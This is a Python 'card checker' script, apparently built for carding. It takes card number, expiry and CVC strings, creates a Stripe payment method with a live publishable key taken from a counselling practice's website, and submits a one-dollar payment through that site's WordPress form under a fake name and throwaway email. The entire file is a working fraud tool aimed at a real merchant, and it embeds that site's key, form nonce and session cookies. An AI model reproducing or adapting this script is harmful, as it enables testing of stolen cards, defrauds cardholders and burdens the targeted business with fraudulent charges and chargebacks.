import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F694e854dc8%3B+stripe-js-v3%2F694e854dc8%3B+card-element&referrer=https%3A%2F%2Fchristiancounselingwpa.com&time_on_page=78302&key=pk_live_51NugfdCLoc4jUS11Xd6TEsElxx0Xf9glieKMDpviTBEcZ5urNkKN1yT9AndOwC7Vtn7uUwDF17qT6dOV9PIagamy00TR6QybfN'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'nitroCachedPage': '0',
	    '_gcl_au': '1.1.1941761439.1732108462',
	    '__ctmid': '673de0ae00038b3118d21f77',
	    '__ctmid': '673de0ae00038b3118d21f77',
	    '__stripe_mid': '460ab3cb-2db1-4edf-890b-560ef47aac21b60c38',
	    '__stripe_sid': '3514c87e-07f2-4834-9982-e7da1710d62592cfea',
	    '_ga_MQGZG0KWKT': 'GS1.1.1732108524.1.0.1732108524.60.0.0',
	    '_ga': 'GA1.1.79866822.1732108525',
	    '_uetsid': '5c460c40a74111efba966993f5643e0c',
	    '_uetvid': '5c4792b0a74111ef8d4a7f101e79fe3d',
	}
	
	headers = {
	    'authority': 'christiancounselingwpa.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'nitroCachedPage=0; _gcl_au=1.1.1941761439.1732108462; __ctmid=673de0ae00038b3118d21f77; __ctmid=673de0ae00038b3118d21f77; __stripe_mid=460ab3cb-2db1-4edf-890b-560ef47aac21b60c38; __stripe_sid=3514c87e-07f2-4834-9982-e7da1710d62592cfea; _ga_MQGZG0KWKT=GS1.1.1732108524.1.0.1732108524.60.0.0; _ga=GA1.1.79866822.1732108525; _uetsid=5c460c40a74111efba966993f5643e0c; _uetvid=5c4792b0a74111ef8d4a7f101e79fe3d',
	    'origin': 'https://christiancounselingwpa.com',
	    'pragma': 'no-cache',
	    'referer': 'https://christiancounselingwpa.com/make-a-payment/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1732108542554',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=26820&_fluentform_3_fluentformnonce=7480fecac9&_wp_http_referer=%2Fmake-a-payment%2F&input_text_1=Vinsmoke&input_text_2=Sanji&input_text_3=&email=jemase9334%40exoular.com&input_text=03%2F10%2F2001&custom-payment-amount=1&payment_method=stripe&message=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://christiancounselingwpa.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())